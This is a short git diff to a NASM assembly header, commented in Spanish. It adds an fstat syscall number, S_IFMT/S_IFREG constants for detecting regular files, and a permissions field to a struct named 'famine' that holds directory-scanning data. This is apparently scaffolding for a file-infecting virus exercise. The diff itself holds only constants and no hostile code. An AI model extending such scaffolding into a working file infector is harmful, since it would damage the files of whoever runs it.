@@ -1,5 +1,6 @@
 %define SC_OPEN         2
 %define SC_CLOSE        3
+%define SC_FSTAT        5
 %define SC_EXIT         60
 %define SC_GETDENTS     78
 %define SC_OPENAT       257      
@@ -7,7 +8,19 @@
 %define	O_RDONLY        0x00000000
 %define O_DIRECTORY     0x00010000
 
-%define REGULAR_FILE    0x08
+; Para dirent
+%define REGULAR_FILE        0x08 
+
+; el st-mode de la fstat struct (144 bytes) indica el tipo de fichero y los permisos. 
+; Está a +24 bytes del inicio de la struct
+; los bytes alto son los del tipo de fichero
+; los bytes bajos son los permisos
+; 
+; Para calcular el tipo de fichero se hace AND sobre 0o170000(S_IFMT) sobre st-mode
+; y en nuestro caso, se compara con 0o100000(S_IFREG) para regular file
+; https://manpages.ubuntu.com/manpages/xenial/es/man2/stat.2.html
+%define S_IFMT      0o170000 
+%define S_IFREG     0o100000   
 
 struc	dirent
     .d_inode	resq    1	; inode number
@@ -22,6 +35,7 @@ struc famine
     .fd_file            resq    1
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
+    .file_permissions   resd    1
 endstruc
 
 
